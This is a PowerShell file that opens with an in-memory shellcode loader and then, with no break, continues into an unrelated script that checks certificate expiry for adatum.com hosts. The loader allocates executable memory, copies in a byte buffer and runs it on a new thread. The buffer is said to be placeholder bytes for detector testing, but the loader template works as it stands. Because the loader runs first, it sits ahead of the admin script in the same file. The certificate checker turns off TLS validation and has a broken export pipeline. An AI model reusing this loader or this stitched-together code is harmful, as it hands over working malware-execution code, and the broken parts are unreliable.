<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

$LogPath = "$env:TEMP\loader.log"

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x56, 0x35, 0x86, 0xde, 0x88, 0x26, 0x63, 0xf4, 0x02, 0x99, 0x61, 0xab, 0x1d, 0x85, 0xb5, 0xe1,
        0x49, 0x86, 0xed, 0x6f, 0xf7, 0x20, 0x90, 0xd9, 0x05, 0x2e, 0xac, 0xaa, 0x70, 0xd9, 0xed, 0xc1,
        0xdf, 0xc1, 0x65, 0xbf, 0x47, 0xcf, 0xab, 0x39, 0x21, 0x47, 0xb3, 0x2a, 0x77, 0x66, 0x1e, 0xac,
        0xae, 0x04, 0x35, 0x95, 0xb3, 0xc4, 0x2a, 0x9a, 0x17, 0x54, 0x93, 0x21, 0x9f, 0x7d, 0xb8, 0x78,
        0x71, 0xc0, 0x97, 0x97, 0x2f, 0x05, 0xaf, 0x3f, 0x73, 0x9f, 0x17, 0x59, 0x27, 0xdc, 0x80, 0xc9,
        0xf3, 0xb9, 0x40, 0x75, 0x60, 0xfd, 0x85, 0x71, 0xf0, 0x74, 0xd2, 0x21, 0x82, 0x30, 0x9a, 0xf8,
        0xe0, 0xcf, 0x2d, 0xed, 0x7e, 0xef, 0xca, 0xc6, 0x2b, 0x4d, 0x03, 0x65, 0x3c, 0x23, 0x75, 0x50,
        0xaa, 0xe9, 0x44, 0xe8, 0x44, 0x9b, 0xae, 0xab, 0xeb, 0xc6, 0x59, 0x74, 0x1d, 0xd1, 0xe3, 0x15,
        0x68, 0x21, 0x63, 0x94, 0x7f, 0x16, 0x0e, 0xb3, 0xba, 0xd3, 0x33, 0x8d, 0xc9, 0xe9, 0x37, 0x7d,
        0x6f, 0x62, 0xb7, 0x5e, 0x0d, 0xf9, 0x9e, 0xc0, 0x25, 0xa8, 0x47, 0xe8, 0xb4, 0x11, 0x41, 0x9e,
        0x7b, 0xf8, 0x72, 0xbc, 0x7d, 0x6c, 0x4e, 0x38, 0xde, 0x55, 0x8f, 0x93, 0xd2, 0x18, 0xca, 0x77,
        0x17, 0x3c, 0x41, 0x6b, 0xb4, 0x5d, 0xa8, 0xea, 0x8a, 0x9a, 0xcf, 0xb2, 0xc9, 0xbf, 0xac, 0x37,
        0x8f, 0xf9, 0xf1, 0x57, 0xc3, 0x6c, 0x24, 0x7d, 0x5d, 0x7b, 0xc4, 0x29, 0xf3, 0xeb, 0x57, 0xa6,
        0xed, 0xf4, 0x25, 0xe6, 0x30, 0x7c, 0xa1, 0x36, 0xf3, 0x47, 0xa7, 0xf8
    )

    $MemoryHandle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($MemoryHandle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $MemoryHandle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeMethods]::WaitForSingleObject($Thread, 3359)
    [void][NativeMethods]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
$ErrorActionPreference = "Stop"
$WarningDays = 21
$Hosts       = @('portal.adatum.com', 'api.adatum.com', 'vpn.adatum.com')
$Port        = 443
$ReportPath  = 'C:\Reports\cert-expiry-2025-09-12.csv'

Set-StrictMode -Version 2.0
$InformationPreference = 'SilentlyContinue'

function Get-CertificateExpiry {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 443
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $client.Connect($ComputerName, $Port)
        $callback = [System.Net.Security.RemoteCertificateValidationCallback] {
            param($sender, $certificate, $chain, $errors)
            return $true
        }
        $stream = New-Object System.Net.Security.SslStream($client.GetStream(), $false, $callback)
        $stream.AuthenticateAsClient($ComputerName)
        $cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]$stream.RemoteCertificate
        [pscustomobject]@{
            Host     = $ComputerName
            Subject  = $cert.Subject
            Issuer   = $cert.Issuer
            NotAfter = $cert.NotAfter
            DaysLeft = [math]::Floor(($cert.NotAfter - (Get-Date)).TotalDays)
        }
        $stream.Dispose()
    }
    finally {
        $client.Close()
    }
}

$stores = @('Cert:\LocalMachine\My', 'Cert:\LocalMachine\WebHosting')
$localCerts = foreach ($store in $stores) {
    Get-ChildItem -Path $store -ErrorAction SilentlyContinue |
        Where-Object { $_.NotAfter -lt (Get-Date).AddDays($WarningDays) } |
        Select-Object @{Name = 'Store'; Expression = { $store }}, Subject, NotAfter,
            @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
}

$remote = foreach ($hostName in $Hosts) {
    try {
        Get-CertificateExpiry -ComputerName $hostName -Port $Port
    }
    catch {
        Write-Warning ("Could not read certificate from {0}" -f $hostName)
    }
}

$remote |
    -NoTypeInformation `
    -Path $ReportPath `
    -Encoding UTF8

$expiring = @($remote | Where-Object { $_.DaysLeft -le $WarningDays })
Write-Host ("{0} of {1} certificates are inside the warning window" -f $expiring.Count, @($remote).Count) -ForegroundColor Cyan
